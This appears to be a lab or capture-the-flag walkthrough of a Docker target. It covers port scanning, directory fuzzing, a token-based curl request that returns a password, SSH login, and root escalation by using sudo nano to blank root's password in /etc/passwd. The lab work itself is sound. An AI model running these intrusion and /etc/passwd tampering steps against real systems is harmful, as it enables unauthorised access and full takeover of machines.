![image](https://github.com/user-attachments/assets/bf63a30e-696d-427b-b9a7-98b1222b8a46)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p80,3000,5000 172.17.0.2 -oN targeted
```
![Pasted image 20250128123638](https://github.com/user-attachments/assets/69bcb57b-cd69-4398-afd6-4515766acde8)
![Pasted image 20250128123733](https://github.com/user-attachments/assets/ee043353-3bfe-4e0d-99c1-364f2e42e95a)

## **Fuzzing**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![Pasted image 20250128123947](https://github.com/user-attachments/assets/f21bf97a-9cf6-49e2-b43b-014c8898cb04)
![Pasted image 20250128125538](https://github.com/user-attachments/assets/7d6079d9-91d3-415b-9d77-14948d7c378c)
![Pasted image 20250128124136](https://github.com/user-attachments/assets/819a02eb-1fab-42af-93ae-4681814697a8)

## **Among the files there is one called server.js which looks like this server listens for POST requests on the `/resource/` path and returns a password if the provided token is correct.**

![Pasted image 20250128125118](https://github.com/user-attachments/assets/e2d94c09-afe3-413a-93e4-368716ec580f)

## **We can test this using curl, if we send the request with post we can observe the password if it is correct and if not it is another text.**
```bash
curl -x POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}'
```
![Pasted image 20250128125943](https://github.com/user-attachments/assets/08b55791-d4ee-46c7-9553-4a1d43be1fd0)

passwd = lapassworddebackupmaschingonadetodas

## **we connect via SSH**
```bash
ssh lovely@172.17.0.2 -p 5000
```
![Pasted image 20250128131639](https://github.com/user-attachments/assets/dfbea74d-eea9-4806-a590-1a9f6f98cc58)

## **now we will try to elevate privileges**
```bash
sudo -l
```
![Pasted image 20250128131747](https://github.com/user-attachments/assets/55d31d82-d4f6-4f90-9bf2-44dfc782d391)

## **we make a tty treatment**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **now that nano has root permissions we can modify the etc/passwd file**
```bash
nano /etc/passwd
```
![Pasted image 20250128132326](https://github.com/user-attachments/assets/f2088cfa-00fd-49ac-84c1-e9ef3d03aa1b)

## **we delete the x so that it does not ask for a password**

![Pasted image 20250128132352](https://github.com/user-attachments/assets/849e9445-ee83-480a-bfc6-f491414a9882)

## **save and change user**
```bash
su root
```
![Pasted image 20250128132446](https://github.com/user-attachments/assets/e69e7b93-fda2-4424-97f5-e5c776d8d481)
